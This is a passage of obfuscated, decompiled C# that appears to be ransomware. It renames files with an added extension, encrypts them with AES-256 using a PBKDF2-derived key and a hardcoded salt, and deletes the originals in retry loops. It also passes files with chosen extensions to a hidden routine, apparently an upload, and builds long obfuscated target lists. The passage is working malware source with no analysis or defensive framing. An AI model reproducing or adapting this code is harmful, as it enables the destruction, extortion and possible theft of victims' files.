					if (oFvDUXnLvZqk == nGvWoWrivTbPL.getString_0(107396904) && new FileInfo(CS_0024_003C_003E8__locals0.KViFGgSYqc).Length > Convert.ToInt32(bHpZgRTqvrgm) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.YizCOSyFjCE != nGvWoWrivTbPL.getString_0(107391848))
							{
								if (YIgbUMLXEZ)
								{
									CS_0024_003C_003E8__locals0.YizCOSyFjCE = HkuaAWARBzGl + CS_0024_003C_003E8__locals0.YizCOSyFjCE;
								}
								File.Move(CS_0024_003C_003E8__locals0.KViFGgSYqc, CS_0024_003C_003E8__locals0.KViFGgSYqc + CS_0024_003C_003E8__locals0.YizCOSyFjCE);
							}
						}
						catch (Exception ex6)
						{
							if (ZdcvQmUKIcPe)
							{
								try
								{
									File.AppendAllText(jYzmyFxkGGuJi, nGvWoWrivTbPL.getString_0(107392612) + CS_0024_003C_003E8__locals0.KViFGgSYqc + nGvWoWrivTbPL.getString_0(107409292) + ex6.Message + nGvWoWrivTbPL.getString_0(107397099));
								}
								catch (Exception)
								{
								}
							}
							FawBoUOtRlQs++;
							return;
						}
						if (CS_0024_003C_003E8__locals0.YizCOSyFjCE != nGvWoWrivTbPL.getString_0(107391848))
						{
							CS_0024_003C_003E8__locals0.KViFGgSYqc += CS_0024_003C_003E8__locals0.YizCOSyFjCE;
						}
						if (SBthqYiSUsxxBW == nGvWoWrivTbPL.getString_0(107396904))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in vjYtJFEhxfpDHt)
								{
									if (CS_0024_003C_003E8__locals0.KViFGgSYqc.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.pcNSSIayBgiA.YizCOSyFjCE) && VPYFBwfqxXvG == nGvWoWrivTbPL.jSEkHtEHBASKbIm.getString_0(107396910))
									{
										if (Convert.ToInt32(NwFhVUnpoETLiI) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.KViFGgSYqc).Length)
										{
											try
											{
												HSDASSgFriA.qlPqGmOVoBTz(nGvWoWrivTbPL.jSEkHtEHBASKbIm.getString_0(107394374), nGvWoWrivTbPL.jSEkHtEHBASKbIm.getString_0(107394401), nGvWoWrivTbPL.jSEkHtEHBASKbIm.getString_0(107394388), CS_0024_003C_003E8__locals0.KViFGgSYqc);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.KViFGgSYqc.ToLower().EndsWith(item3) && VPYFBwfqxXvG == nGvWoWrivTbPL.jSEkHtEHBASKbIm.getString_0(107396827))
									{
										try
										{
											HSDASSgFriA.qlPqGmOVoBTz(nGvWoWrivTbPL.jSEkHtEHBASKbIm.getString_0(107394374), nGvWoWrivTbPL.jSEkHtEHBASKbIm.getString_0(107394401), nGvWoWrivTbPL.jSEkHtEHBASKbIm.getString_0(107394388), CS_0024_003C_003E8__locals0.KViFGgSYqc);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = sCnthEhwQbhLh.VOKyuCSpMLw(32);
						string s = BbfzHGzwtqigo.eTbdqfTZKGyJb(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = cLYeTxTBifMvTiA.SlfvoYGuggAUU(CS_0024_003C_003E8__locals0.KViFGgSYqc, Convert.ToInt32(bHpZgRTqvrgm) * 1024 * 1024);
						if (!cLYeTxTBifMvTiA.DcIicDuahJozxMuyl(ESwOHaZtwoDL: (!cWvIRXFCjdwL) ? (sBOTyxVoVCQkJ ? cLYeTxTBifMvTiA.MBIBwyqqrY(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : cLYeTxTBifMvTiA.MBIBwyqqrY(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.pxxUCyFtCioCIq), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (sBOTyxVoVCQkJ ? hwfWuUfzvIUG.iHBkWBbpwRJtWO(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : hwfWuUfzvIUG.iHBkWBbpwRJtWO(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.pxxUCyFtCioCIq), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), KvQkETPykCnn: CS_0024_003C_003E8__locals0.KViFGgSYqc, GvYIVDINSEjKoB: bytes))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.KViFGgSYqc + CS_0024_003C_003E8__locals0.YizCOSyFjCE, CS_0024_003C_003E8__locals0.KViFGgSYqc);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (YIgbUMLXEZ)
						{
							CS_0024_003C_003E8__locals0.YizCOSyFjCE = HkuaAWARBzGl + CS_0024_003C_003E8__locals0.YizCOSyFjCE;
						}
						string text2 = sCnthEhwQbhLh.VOKyuCSpMLw(32);
						string s2 = BbfzHGzwtqigo.eTbdqfTZKGyJb(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (CS_0024_003C_003E8__locals0.YizCOSyFjCE != nGvWoWrivTbPL.getString_0(107391848))
						{
							if (!GIsCSxnycEXIm)
							{
								if (!sBOTyxVoVCQkJ)
								{
									oYMtlOMiGDwjD(CS_0024_003C_003E8__locals0.KViFGgSYqc, CS_0024_003C_003E8__locals0.KViFGgSYqc + CS_0024_003C_003E8__locals0.YizCOSyFjCE, LPxApPwqniHY);
								}
								else
								{
									oYMtlOMiGDwjD(CS_0024_003C_003E8__locals0.KViFGgSYqc, CS_0024_003C_003E8__locals0.KViFGgSYqc + CS_0024_003C_003E8__locals0.YizCOSyFjCE, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!sBOTyxVoVCQkJ)
									{
										MxFmhWgVdORlqd(CS_0024_003C_003E8__locals0.KViFGgSYqc, CS_0024_003C_003E8__locals0.KViFGgSYqc + CS_0024_003C_003E8__locals0.YizCOSyFjCE, LPxApPwqniHY);
									}
									else
									{
										MxFmhWgVdORlqd(CS_0024_003C_003E8__locals0.KViFGgSYqc, CS_0024_003C_003E8__locals0.KViFGgSYqc + CS_0024_003C_003E8__locals0.YizCOSyFjCE, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex9)
								{
									if (ZdcvQmUKIcPe)
									{
										try
										{
											File.AppendAllText(jYzmyFxkGGuJi, nGvWoWrivTbPL.getString_0(107392612) + CS_0024_003C_003E8__locals0.KViFGgSYqc + nGvWoWrivTbPL.getString_0(107391866) + ex9.Message + nGvWoWrivTbPL.getString_0(107397099));
										}
										catch (Exception)
										{
										}
									}
									FawBoUOtRlQs++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.KViFGgSYqc + CS_0024_003C_003E8__locals0.YizCOSyFjCE, CS_0024_003C_003E8__locals0.KViFGgSYqc);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!GIsCSxnycEXIm)
						{
							if (!sBOTyxVoVCQkJ)
							{
								oYMtlOMiGDwjD(CS_0024_003C_003E8__locals0.KViFGgSYqc, CS_0024_003C_003E8__locals0.KViFGgSYqc + nGvWoWrivTbPL.getString_0(107391843), LPxApPwqniHY);
							}
							else
							{
								oYMtlOMiGDwjD(CS_0024_003C_003E8__locals0.KViFGgSYqc, CS_0024_003C_003E8__locals0.KViFGgSYqc + nGvWoWrivTbPL.getString_0(107391843), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!sBOTyxVoVCQkJ)
								{
									MxFmhWgVdORlqd(CS_0024_003C_003E8__locals0.KViFGgSYqc, CS_0024_003C_003E8__locals0.KViFGgSYqc, LPxApPwqniHY);
								}
								else
								{
									MxFmhWgVdORlqd(CS_0024_003C_003E8__locals0.KViFGgSYqc, CS_0024_003C_003E8__locals0.KViFGgSYqc, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex12)
							{
								if (ZdcvQmUKIcPe)
								{
									try
									{
										File.AppendAllText(jYzmyFxkGGuJi, nGvWoWrivTbPL.getString_0(107392612) + CS_0024_003C_003E8__locals0.KViFGgSYqc + nGvWoWrivTbPL.getString_0(107391866) + ex12.Message + nGvWoWrivTbPL.getString_0(107397099));
									}
									catch (Exception)
									{
									}
								}
								FawBoUOtRlQs++;
								return;
							}
						}
						if (sBOTyxVoVCQkJ)
						{
							if (CS_0024_003C_003E8__locals0.YizCOSyFjCE != nGvWoWrivTbPL.getString_0(107391848))
							{
								YlXQQyoEsG(CS_0024_003C_003E8__locals0.KViFGgSYqc + CS_0024_003C_003E8__locals0.YizCOSyFjCE, bytes2);
							}
							else
							{
								YlXQQyoEsG(CS_0024_003C_003E8__locals0.KViFGgSYqc, bytes2);
							}
						}
					}
					end_IL_031d_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0a13;
			IL_0a13:
			CS_0024_003C_003E8__locals0.BuhDElShFyYqgkBDZ.Remove(CS_0024_003C_003E8__locals0.KViFGgSYqc);
		});
	}

	private static void ipaWLeVyqWGh(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (SBthqYiSUsxxBW == getString_0(107396887))
					{
						foreach (string item in vjYtJFEhxfpDHt)
						{
							if (string_0.ToLower().EndsWith(item) && VPYFBwfqxXvG == getString_0(107396887))
							{
								if (Convert.ToInt32(NwFhVUnpoETLiI) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										HSDASSgFriA.qlPqGmOVoBTz(getString_0(107394351), getString_0(107394378), getString_0(107394365), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && VPYFBwfqxXvG == getString_0(107396804))
							{
								try
								{
									HSDASSgFriA.qlPqGmOVoBTz(getString_0(107394351), getString_0(107394378), getString_0(107394365), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107391826)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107391826), getString_0(107394302)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void MxFmhWgVdORlqd(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			if (SBthqYiSUsxxBW == getString_0(107396887))
			{
				FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in vjYtJFEhxfpDHt)
				{
					if (string_0.ToLower().EndsWith(item) && VPYFBwfqxXvG == getString_0(107396887))
					{
						if (Convert.ToInt32(NwFhVUnpoETLiI) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								HSDASSgFriA.qlPqGmOVoBTz(getString_0(107394351), getString_0(107394378), getString_0(107394365), string_0);
							}
							catch
							{
							}
						}
					}
					else if (string_0.ToLower().EndsWith(item) && VPYFBwfqxXvG == getString_0(107396804))
					{
						try
						{
							HSDASSgFriA.qlPqGmOVoBTz(getString_0(107394351), getString_0(107394378), getString_0(107394365), string_0);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (string_0 != string_1)
		{
			File.Move(string_0, string_1);
			string_0 = string_1;
		}
		byte[] bytes = hwfWuUfzvIUG.iHBkWBbpwRJtWO(File.ReadAllBytes(string_0), byte_0, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(string_0, bytes);
		osEpTgsdhQw++;
	}

	private static void oYMtlOMiGDwjD(string string_0, string string_1, byte[] byte_0)
	{
		FerCFzqhQgGeXd CS_0024_003C_003E8__locals0 = new FerCFzqhQgGeXd();
		CS_0024_003C_003E8__locals0.NwIrEpZzCQYOE = string_0;
		CS_0024_003C_003E8__locals0.caeCAmsUBmyy = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string caeCAmsUBmyy = CS_0024_003C_003E8__locals0.caeCAmsUBmyy;
			FileStream fileStream = new FileStream(caeCAmsUBmyy, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (dnEIlaYQbZTn == getString_0(107396887))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.NwIrEpZzCQYOE, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.NwIrEpZzCQYOE, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.NwIrEpZzCQYOE, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.caeCAmsUBmyy.Length > 0)
				{
					if (SBthqYiSUsxxBW == getString_0(107396887))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.NwIrEpZzCQYOE, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in vjYtJFEhxfpDHt)
						{
							if (CS_0024_003C_003E8__locals0.NwIrEpZzCQYOE.ToLower().EndsWith(item) && VPYFBwfqxXvG == getString_0(107396887))
							{
								if (Convert.ToInt32(NwFhVUnpoETLiI) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										HSDASSgFriA.qlPqGmOVoBTz(getString_0(107394351), getString_0(107394378), getString_0(107394365), CS_0024_003C_003E8__locals0.NwIrEpZzCQYOE);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.NwIrEpZzCQYOE.ToLower().EndsWith(item) && VPYFBwfqxXvG == getString_0(107396804))
							{
								try
								{
									HSDASSgFriA.qlPqGmOVoBTz(getString_0(107394351), getString_0(107394378), getString_0(107394365), CS_0024_003C_003E8__locals0.NwIrEpZzCQYOE);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.NwIrEpZzCQYOE);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.caeCAmsUBmyy.EndsWith(getString_0(107391826)))
					{
						File.Move(CS_0024_003C_003E8__locals0.caeCAmsUBmyy, CS_0024_003C_003E8__locals0.caeCAmsUBmyy.Replace(getString_0(107391826), getString_0(107394302)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.caeCAmsUBmyy))
							{
								File.Delete(CS_0024_003C_003E8__locals0.caeCAmsUBmyy);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (ZdcvQmUKIcPe)
			{
				try
				{
					File.AppendAllText(jYzmyFxkGGuJi, getString_0(107392595) + CS_0024_003C_003E8__locals0.NwIrEpZzCQYOE + getString_0(107391849) + ex2.Message + getString_0(107397082));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__5()
	{
		List<string> source = qYFjYYmMGKdoc;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate(string string_0)
			{
				VhRTDkROaDJx(tzJESwPzibp(getString_0(107391764)), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
		List<string> kzxmThJmEyI = KzxmThJmEyI;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
			{
				VhRTDkROaDJx(tzJESwPzibp(getString_0(107391783)), string_0);
			};
		}
		Parallel.ForEach(kzxmThJmEyI, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
		if (MORlMWTkXsY == getString_0(107396887))
		{
			string[] jYXUPHymAoH = JYXUPHymAoH;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
				{
					VhRTDkROaDJx(tzJESwPzibp(getString_0(107391783)), getString_0(107391726) + string_0 + getString_0(107391749));
				};
			}
			Parallel.ForEach(jYXUPHymAoH, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		}
		if (!pecXPOiThg().Contains(getString_0(107392461)))
		{
			VmtCVaiDDCwJtQU(DUhHuAgmahdlA);
		}
		else
		{
			List<string> qHdIaewLqjzP = QHdIaewLqjzP;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
				{
					VhRTDkROaDJx(tzJESwPzibp(iEGJafDjDASROi(getString_0(107391744))), string_0);
				};
			}
			Parallel.ForEach(qHdIaewLqjzP, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		}
		List<string> source2 = jiYEBLyFlYFm;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
			{
				VhRTDkROaDJx(tzJESwPzibp(getString_0(107391719)), string_0);
			};
		}
		Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
	}

	private static void _003CMain_003Eb__6(string string_0)
	{
		VhRTDkROaDJx(tzJESwPzibp(getString_0(107391764)), string_0);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		VhRTDkROaDJx(tzJESwPzibp(getString_0(107391783)), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		VhRTDkROaDJx(tzJESwPzibp(getString_0(107391783)), getString_0(107391726) + string_0 + getString_0(107391749));
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		VhRTDkROaDJx(tzJESwPzibp(iEGJafDjDASROi(getString_0(107391744))), string_0);
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		VhRTDkROaDJx(tzJESwPzibp(getString_0(107391719)), string_0);
	}

	static NXVLxNyJvZLW()
	{
		Strings.CreateGetStringDelegate(typeof(NXVLxNyJvZLW));
		fIQvUmxkAl = getString_0(107394246);
		LPxApPwqniHY = null;
		nMpuHIafUPAp = getString_0(107396804);
		YJkGJJBIRovOj = getString_0(107391670);
		bVwnJgANJJX = new List<string>();
		iqrCuzvYkXjwtcm = new List<string>();
		tcsQFxjWmOpsK = getString_0(107396804);
		pxxUCyFtCioCIq = getString_0(107394302);
		aBmGKQqQKOKXI = getString_0(107394302);
		ScUsvWmHCwCQV = getString_0(107396804);
		fAaPLvxVdIH = 0;
		MUSNUeGXusODlj = getString_0(107396804);
		hvAaCDJUKlNlyQ = getString_0(107396804);
		LqttSwDKeOfKVGL = getString_0(107396804);
		aTdamFrIht = getString_0(107391689);
		LSXFEDBHoFy = getString_0(107396804);
		QGhmFcSSOpd = getString_0(107396804);
		yLikURVvfMWn = getString_0(107396804);
		vtClXupzLIIa = getString_0(107396804);
		VfMwKIJnDnq = new List<string>
		{
			tzJESwPzibp(getString_0(107391684)),
			tzJESwPzibp(getString_0(107391635)),
			tzJESwPzibp(getString_0(107391610)),
			tzJESwPzibp(getString_0(107391625)),
			tzJESwPzibp(getString_0(107392080)),
			tzJESwPzibp(getString_0(107392055)),
			tzJESwPzibp(getString_0(107392070)),
			tzJESwPzibp(getString_0(107392013)),
			tzJESwPzibp(getString_0(107391988)),
			tzJESwPzibp(getString_0(107391963)),
			tzJESwPzibp(getString_0(107391978)),
			tzJESwPzibp(getString_0(107391921)),
			tzJESwPzibp(getString_0(107391896))
		};
		UPKUrcjvrOIo = new List<string>();
		pCDNamZZtcA = getString_0(107396804);
		hxlrzYNLXivY = getString_0(107396804);
		HEFxJIDyDOEQ = getString_0(107396804);
		WEPWhUGwUtN = new List<string>();
		eAVlYZIMgieUnrF = getString_0(107396804);
		gowQgPpclwyAR = getString_0(107391903);
		zZukKkiWQnr = getString_0(107396887);
		ADXABfgmLhC = getString_0(107396804);
		ZRptOrpWitgI = new List<string>
		{
			tzJESwPzibp(getString_0(107391310)),
			tzJESwPzibp(getString_0(107391277)),
			tzJESwPzibp(getString_0(107391276)),
			tzJESwPzibp(getString_0(107391243)),
			tzJESwPzibp(getString_0(107391210)),
			tzJESwPzibp(getString_0(107391149)),
			tzJESwPzibp(getString_0(107391092)),
			tzJESwPzibp(getString_0(107391575)),
			tzJESwPzibp(getString_0(107391562)),
			tzJESwPzibp(getString_0(107391497)),
			tzJESwPzibp(getString_0(107391464)),
			tzJESwPzibp(getString_0(107391431)),
			tzJESwPzibp(getString_0(107391398)),
			tzJESwPzibp(getString_0(107391369)),
			tzJESwPzibp(getString_0(107390828)),
			tzJESwPzibp(getString_0(107390787)),
			tzJESwPzibp(getString_0(107390714)),
			tzJESwPzibp(getString_0(107390689)),
			tzJESwPzibp(getString_0(107390608)),
			tzJESwPzibp(getString_0(107390575)),
			tzJESwPzibp(getString_0(107391058)),
			tzJESwPzibp(getString_0(107391049)),
			tzJESwPzibp(getString_0(107391008)),
			tzJESwPzibp(getString_0(107390975)),
			tzJESwPzibp(getString_0(107390894)),
			tzJESwPzibp(getString_0(107390837)),
			tzJESwPzibp(getString_0(107390316)),
			tzJESwPzibp(getString_0(107390255)),
			tzJESwPzibp(getString_0(107390246)),
			tzJESwPzibp(getString_0(107390157)),
			tzJESwPzibp(getString_0(107390124)),
			tzJESwPzibp(getString_0(107390547)),
			tzJESwPzibp(getString_0(107390482)),
			tzJESwPzibp(getString_0(107390465)),
			tzJESwPzibp(getString_0(107390400)),
			tzJESwPzibp(getString_0(107390343)),
			tzJESwPzibp(getString_0(107389798)),
			tzJESwPzibp(getString_0(107389757)),
			tzJESwPzibp(getString_0(107389684)),
			tzJESwPzibp(getString_0(107389671)),
			tzJESwPzibp(getString_0(107389642)),
			tzJESwPzibp(getString_0(107389577)),
			tzJESwPzibp(getString_0(107390048)),
			tzJESwPzibp(getString_0(107390015)),
			tzJESwPzibp(getString_0(107389942)),
			tzJESwPzibp(getString_0(107389925)),
			tzJESwPzibp(getString_0(107389848)),
			tzJESwPzibp(getString_0(107389263)),
			tzJESwPzibp(getString_0(107389250)),
			tzJESwPzibp(getString_0(107389173)),
			tzJESwPzibp(getString_0(107389160)),
			tzJESwPzibp(getString_0(107389119)),
			tzJESwPzibp(getString_0(107389526)),
			tzJESwPzibp(getString_0(107389497)),
			tzJESwPzibp(getString_0(107389456)),
			tzJESwPzibp(getString_0(107389391)),
			tzJESwPzibp(getString_0(107389378)),
			tzJESwPzibp(getString_0(107389349)),
			tzJESwPzibp(getString_0(107388760)),
			tzJESwPzibp(getString_0(107388695)),
			tzJESwPzibp(getString_0(107388666)),
			tzJESwPzibp(getString_0(107388641)),
			tzJESwPzibp(getString_0(107388576)),
			tzJESwPzibp(getString_0(107389015)),
			tzJESwPzibp(getString_0(107388986)),
			tzJESwPzibp(getString_0(107388945)),
			tzJESwPzibp(getString_0(107388896)),
			tzJESwPzibp(getString_0(107388835)),
			tzJESwPzibp(getString_0(107388218)),
			tzJESwPzibp(getString_0(107388173)),
			tzJESwPzibp(getString_0(107388172)),
			tzJESwPzibp(getString_0(107388131)),
			tzJESwPzibp(getString_0(107388022)),
			tzJESwPzibp(getString_0(107388521)),
			tzJESwPzibp(getString_0(107388400)),
			tzJESwPzibp(getString_0(107388383)),
			tzJESwPzibp(getString_0(107388354)),
			tzJESwPzibp(getString_0(107388281)),
			tzJESwPzibp(getString_0(107387704)),
			tzJESwPzibp(getString_0(107387687)),
			tzJESwPzibp(getString_0(107387598)),
			tzJESwPzibp(getString_0(107387565)),
			tzJESwPzibp(getString_0(107387504)),
			tzJESwPzibp(getString_0(107387959)),
			tzJESwPzibp(getString_0(107390343)),
			tzJESwPzibp(getString_0(107387934)),
			tzJESwPzibp(getString_0(107387861)),
			tzJESwPzibp(getString_0(107387772)),
			tzJESwPzibp(getString_0(107387215)),
			tzJESwPzibp(getString_0(107387154)),
			tzJESwPzibp(getString_0(107387129)),
			tzJESwPzibp(getString_0(107387116)),
			tzJESwPzibp(getString_0(107387035)),
			tzJESwPzibp(getString_0(107390157)),
			tzJESwPzibp(getString_0(107387482)),
			tzJESwPzibp(getString_0(107387441)),
			tzJESwPzibp(getString_0(107387384)),
			tzJESwPzibp(getString_0(107390124)),
			tzJESwPzibp(getString_0(107387311)),
			tzJESwPzibp(getString_0(107387294)),
			tzJESwPzibp(getString_0(107386693)),
			tzJESwPzibp(getString_0(107386628)),
			tzJESwPzibp(getString_0(107386547)),
			tzJESwPzibp(getString_0(107390482)),
			tzJESwPzibp(getString_0(107386502)),
			tzJESwPzibp(getString_0(107389798)),
			tzJESwPzibp(getString_0(107390465)),
			tzJESwPzibp(getString_0(107386981)),
			tzJESwPzibp(getString_0(107386924)),
			tzJESwPzibp(getString_0(107390400)),
			tzJESwPzibp(getString_0(107386891)),
			tzJESwPzibp(getString_0(107386810)),
			tzJESwPzibp(getString_0(107386793)),
			tzJESwPzibp(getString_0(107390246)),
			tzJESwPzibp(getString_0(107386736)),
			tzJESwPzibp(getString_0(107386211)),
			tzJESwPzibp(getString_0(107386182)),
			tzJESwPzibp(getString_0(107386153)),
			tzJESwPzibp(getString_0(107386076)),
			tzJESwPzibp(getString_0(107386043)),
			tzJESwPzibp(getString_0(107386050)),
			tzJESwPzibp(getString_0(107385973)),
			tzJESwPzibp(getString_0(107386460)),
			tzJESwPzibp(getString_0(107386419)),
			tzJESwPzibp(getString_0(107386406)),
			tzJESwPzibp(getString_0(107386325)),
			tzJESwPzibp(getString_0(107386268)),
			tzJESwPzibp(getString_0(107386235)),
			tzJESwPzibp(getString_0(107385678)),
			tzJESwPzibp(getString_0(107385645)),
			tzJESwPzibp(getString_0(107385636)),
			tzJESwPzibp(getString_0(107390255)),
			tzJESwPzibp(getString_0(107386325)),
			tzJESwPzibp(getString_0(107385563)),
			tzJESwPzibp(getString_0(107385566)),
			tzJESwPzibp(getString_0(107385537)),
			tzJESwPzibp(getString_0(107385456)),
			tzJESwPzibp(getString_0(107385959)),
			tzJESwPzibp(getString_0(107385898)),
			tzJESwPzibp(getString_0(107385825)),
			tzJESwPzibp(getString_0(107385796)),
			tzJESwPzibp(getString_0(107385763)),
			tzJESwPzibp(getString_0(107385146)),
			tzJESwPzibp(getString_0(107385149)),
			tzJESwPzibp(getString_0(107385072)),
			tzJESwPzibp(getString_0(107385007)),
			tzJESwPzibp(getString_0(107384974)),
			tzJESwPzibp(getString_0(107384961)),
			tzJESwPzibp(getString_0(107385412)),
			tzJESwPzibp(getString_0(107385379)),
			tzJESwPzibp(getString_0(107385302)),
